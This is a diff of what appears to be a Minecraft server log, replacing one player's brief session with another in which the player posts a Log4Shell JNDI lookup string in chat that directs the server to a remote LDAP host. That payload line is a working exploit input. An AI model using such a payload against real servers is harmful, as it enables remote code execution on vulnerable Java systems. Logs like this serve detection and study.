@@ -1,5 +1,6 @@
-[20:53:20] [User Authenticator #5/INFO]: UUID of player Bilibili_Feng is 8f50b361-68dc-4cd4-a00b-b739cb4800af
-[20:53:20] [Server thread/INFO]: Bilibili_Feng[/207.244.236.144:33396] logged in with entity id 2143 at (-28.5, 82.0, -73.5)
-[20:53:20] [Server thread/INFO]: Bilibili_Feng joined the game
-[20:53:25] [Server thread/INFO]: Bilibili_Feng lost connection: Disconnected
-[20:53:25] [Server thread/INFO]: Bilibili_Feng left the game
+[09:37:22] [User Authenticator #6/INFO]: UUID of player FermatSleep is 9abd3b4d-a8cd-4290-acc5-303c74da3e3f
+[09:37:22] [Server thread/INFO]: FermatSleep[/195.154.52.77:57254] logged in with entity id 2227 at (-24.5, 73.0, -57.5)
+[09:37:22] [Server thread/INFO]: FermatSleep joined the game
+[09:37:23] [Server thread/INFO]: <FermatSleep> ${jndi:ldap://195.154.52.77:1389/a}
+[09:37:25] [Server thread/INFO]: FermatSleep lost connection: Disconnected
+[09:37:25] [Server thread/INFO]: FermatSleep left the game
